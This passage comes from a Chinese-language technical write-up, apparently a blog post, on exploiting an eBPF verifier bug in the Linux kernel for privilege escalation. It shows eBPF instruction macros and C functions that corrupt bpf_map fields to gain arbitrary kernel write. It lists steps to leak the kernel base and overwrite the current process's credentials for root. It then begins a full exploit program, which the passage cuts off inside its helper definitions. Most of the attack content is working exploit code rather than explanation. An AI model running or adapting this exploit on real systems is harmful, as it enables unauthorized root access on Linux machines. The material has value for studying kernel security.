<li>如果正常调用 <code>map_get_next_key</code>：只能控制 <code>key</code> 但是 <code>next_key</code> 不能控制</li>
<li>如果通过函数指针 <code>ops-&gt;map_push_elem</code> 进行调用：可以控制这两个参数</li>
</ul>
<p>当我们更新 eBPF map 时，若 map 类型为 <code>BPF_MAP_TYPE_QUEUE</code> 或 <code>BPF_MAP_TYPE_STACK</code>，则函数 <code>bpf_map-&gt;ops-&gt;map_push_elem</code> 就会被调用，不过在函数 <code>map_update_elem</code> 中还有一个检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;</span><br><span class="line">	    !map_value_has_spin_lock(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">map_value_has_spin_lock</span><span class="params">(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>-&gt;spin_lock_off &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>若 flags 设置了 <code>BPF_F_LOCK</code> 标志位，则会检查 <code>map-&gt;spin_lock_off</code> 是否大于等于 0，因此这里我们还要将该字段改为一个正整数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)                  \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu_limit */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite spin_lock_off */</span>                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),                   \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite max_entries */</span>                         \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite map_type */</span>                            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite the map-&gt;ops */</span>                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4),     \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前半部分使用相同的方法来绕过 <code>alu_limit</code>，后半部分尝试覆盖 <code>bpf_map</code> 中的各个条目：<ul>
<li><code>spin_lock_off = 0x2000</code>（绕过 <code>map_update_elem</code> 中的检查）</li>
<li><code>max_entries = 0xffffffff</code>（为了满足 <code>key &lt; map.max_entries</code> 的条件）</li>
<li><code>map_type = 23(BPF_MAP_TYPE_STACK)</code>（为了使 <code>bpf_map-&gt;ops-&gt;map_push_elem</code> 能被调用）</li>
<li><code>ops = target_addr</code>（设置写入的目标地址）</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_arbitrary_write_ops</span><span class="params">(<span class="keyword">int</span> map_fd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        MAKE_ARBITRARY_WRITE_OPS(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> per_ops_ptr, value[<span class="number">0x1000</span>], value_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops_data</span>;</span></span><br><span class="line"></span><br><span class="line">    fake_ops_addr = map_addr + <span class="number">0x110</span> + MAP_SIZE; <span class="comment">/* save fake ops addr into map */</span></span><br><span class="line"></span><br><span class="line">    value_idx = <span class="number">0</span>; <span class="comment">/* 读取bpf_map-&gt;ops,以保证程序的正常功能 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(struct bpf_map_ops); i += <span class="number">8</span>)&#123;</span><br><span class="line">        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);</span><br><span class="line">        value[value_idx++] = per_ops_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ops_data = (struct bpf_map_ops *)value; <span class="comment">/* 覆写bpf_map-&gt;ops-&gt;map_push_elem */</span></span><br><span class="line">    ops_data-&gt;map_push_elem = (<span class="keyword">void</span> *)(ARRAY_MAP_GET_NEXT_KEY + kernel_offset);</span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = fake_ops_addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在获取以上所有组件之后，程序的入侵步骤如下：</p>
<ul>
<li>泄露 <code>map_ops_addr</code> 计算内核基地址</li>
<li>泄露 <code>map_addr</code></li>
<li>利用 RAA 扫描内存，泄露 <code>current_task</code> 和 <code>current_cred</code></li>
<li>覆盖 <code>bpf_map-&gt;ops-&gt;map_push_elem</code>，为 WAA 做准备</li>
<li>利用 WAA 覆盖 <code>current_cred</code> 并进行提权</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">err_print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Run eBPF error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn) &#123;                                \</span></span><br><span class="line"><span class="meta">        .code        = CODE,                            \</span></span><br><span class="line"><span class="meta">        .dst_reg     = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg     = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off         = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm         = IMM                              \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU32_REG(OP, DST, SRC)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU32_IMM(OP, DST, IMM)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)                 \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, 0, (uint32_t) (IMM)),\</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(0, 0, 0, 0, ((uint64_t) (IMM)) &gt;&gt; 32)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM)                          \</span></span><br><span class="line"><span class="meta">        BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BPF_PSEUDO_MAP_FD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> BPF_PSEUDO_MAP_FD	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD)                      \</span></span><br><span class="line"><span class="meta">        BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Direct packet access, R0 = *(uint *) (skb-&gt;data + imm32) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_ABS(SIZE, IMM)                           \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, 0, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF)          \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, DST, SRC, OFF, OP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_XADD(SIZE, DST, SRC, OFF)               \</span></span><br><span class="line"><span class="meta">        BPF_ATOMIC_OP(SIZE, BPF_ADD, DST, SRC, OFF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* *(uint *) (dst_reg + off16) = imm */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ST_MEM(SIZE, DST, OFF, IMM)                 \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_REG(OP, DST, SRC, OFF)                  \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_REG(OP, DST, SRC, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)                  \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()                                 \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* get a pointer to bpf_array */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span></span><br><span class="line"><span class="meta">        